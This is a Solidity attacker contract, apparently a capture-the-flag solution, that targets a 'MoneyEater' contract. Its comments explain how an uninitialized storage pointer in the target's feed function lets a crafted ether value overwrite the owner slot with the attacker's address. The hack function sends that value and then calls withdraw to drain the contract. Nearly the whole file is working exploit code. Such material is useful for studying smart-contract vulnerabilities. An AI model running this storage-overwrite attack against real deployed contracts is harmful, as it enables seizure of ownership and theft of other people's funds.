pragma solidity ^0.4.21;


import "./MoneyEater.sol";


contract MoneyEaterAttacker{
    
    MoneyEater eater;
    address player = address(this);
    function MoneyEaterAttacker(address _addr)public{
        eater = MoneyEater(_addr);
    }

    event isCompleteEvent(bool isComplete);
    //The feed method creates an uninitialized storage pointer
    //When defining structs one should always define the location, either memory or storage.
    //When omitted, storage is assumed
    // The meal.timestamp are allocated in slot 0 and meal.etherAmount in the slot 1(where the owner address is located)

    // need to choose etherAmount in a way such that it overwrites the owner with ou address
    function hack() public
    {
        // 1 ether := 10**18 => scale is 10**18 * 10**18 = 10**36
        uint256 num_exploit = uint256(address(player)) / 10**36;
        // If we send the decimal number that is equal to our attack account address, the owner became us
        eater.feed.value(num_exploit)(num_exploit);
        //And then all that is left is call withdraw
        eater.withdraw();
        emit isCompleteEvent(eater.isComplete());
    }
}